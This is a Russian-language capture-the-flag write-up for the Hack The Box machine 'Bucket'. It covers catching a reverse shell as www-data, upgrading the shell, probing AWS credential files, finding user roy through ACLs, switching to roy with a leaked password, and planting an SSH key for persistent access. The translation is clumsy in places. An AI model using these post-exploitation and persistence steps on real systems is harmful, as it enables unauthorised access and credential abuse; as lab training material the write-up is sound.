## Shell as www-data

Нам удалось вывести свой оболочку из бакета и увидеть, что мы являемся пользователем `www-data`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.10.212] 42766
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:58:18 up  4:38,  0 users,  load average: 0.12, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Теперь давайте обновим нашу оболочку, используя [[Linux Shells#Backgrounding Shell Trick]]:

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bucket:/$ ^Z  
[1]+  Stopped                 nc -lnvp 9001
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ stty raw -echo
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
nc -lnvp 9001

www-data@bucket:/$ 
```

## Энтеримизация

Оглядывая директорию корня, мы видим папку `.aws`, которая, как я знаю по опыту, содержит учетные данные:

```bash
www-data@bucket:/$ cd .aws
www-data@bucket:/.aws$ ls
config	credentials
www-data@bucket:/.aws$ cat credentials
cat: credentials: Permission denied
```

Однако мы не можем прочитать её.

Перейдя в домашнюю директорию, мы видим новую папку с названием `bucket-app`. Эта также доступна только для root, но имеет заглавное `+` рядом с ней.

```bash
www-data@bucket:/.aws$ cd ~
www-data@bucket:/var/www$ ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 Apr 29 09:07 html
```

Когда я впервые работал с этой машиной, я попытался найти пользователя, к которому можно перейти с учетными данными, которые я нашёл в DDB. Я сделал это, вывел содержимое директории `/home` и нашёл директорию `/home/roy`.

Другие способы обнаружения `roy` включали:
- Запуск `cat /etc/passwd`, чтобы посмотреть пользователей на маше
- Запуск `getfacl bucket-app`, чтобы просмотреть список доступа к директории `bucket-app`

Заглавное `+` рядом с именем файла указывает, что мы можем использовать последний способ — это показывает, что на файле есть дополнительные права помимо обычных `rwx` права Linux — это обычно список доступа, или ACL, и можно прочитать его с помощью команды `getfacl`:

```bash
www-data@bucket:/var/www$ getfacl bucket-app
# file: bucket-app
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

Это показывает нам пользователя `roy`.

## Перейти к Roy

Теперь мы можем попытаться переключить пользователя на `roy`. Я попробовал все [[Writeups/Hack the Box/Boxes/Bucket/1 - Loot|password that we leaked]], и обнаружил, что `n2vM-<_K_Q:.Aa2` работает:

```bash
www-data@bucket:/var/www$ su roy
Password: 
roy@bucket:/var/www$
```

Теперь мы можем попытаться подключиться SSH как roy с этим паролем:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/uploads]
└─$ ssh roy@10.10.10.212
The authenticity of host '10.10.10.212 (10.10.10.212)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.212' (ECDSA) to the list of known hosts.
roy@10.10.10.212's password: 

...[snip]...

  System information as of Thu 29 Apr 2021 09:16:39 AM UTC

  System load:                      0.09
  Usage of /:                       33.6% of 17.59GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:f4a2


...[snip]...

Last login: Wed Sep 23 03:33:53 2020 from 10.10.14.2
roy@bucket:~$ 
```

Успех! Теперь мы можем отказаться от болезненно медленного PHP reverse shell и использовать SSH. Банер входа также дал нам некоторую потенциально полезную информацию, поэтому я включил её в записки.

### Постоянное SSH

Если по какой-то причине пароль не сработал, мы могли бы попробовать удалить нашу собственную ключ SSH для постоянного доступа. На самом деле, именно это я сделал, когда первоначально решил машину. Если у `roy` была папка `.ssh`, мы могли бы сохранить его файл `id_rsa` на нашей маше и использовать его для подключения, что лучше для OpSec. Однако он не имел такой папки, поэтому вместо этого мы можем загрузить свою собственную.

На нашей локальной маше мы можем [[Fundamental Skills#SSH Keys|create an ssh key pair]]:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ ssh-keygen -f roy
┌──(mac㉿kali)-[~/Documents/HTB/bucket/ssh]
└─$ cat roy.pub 
ssh-rsa AAAAB3...[snip]...+Ol9tVADE= mac@kali
```

На удалённой маше создать директорию `.ssh` и добавить нашу публичную ключ в файл authorized keys:

```bash
roy@bucket:~$ mkdir .ssh
roy@bucket:~$ echo 'ssh-rsa AAAAB3...[snip]...+Ol9tVADE= mac@kali' > .ssh/authorized_keys
```

# Tags

#writeup
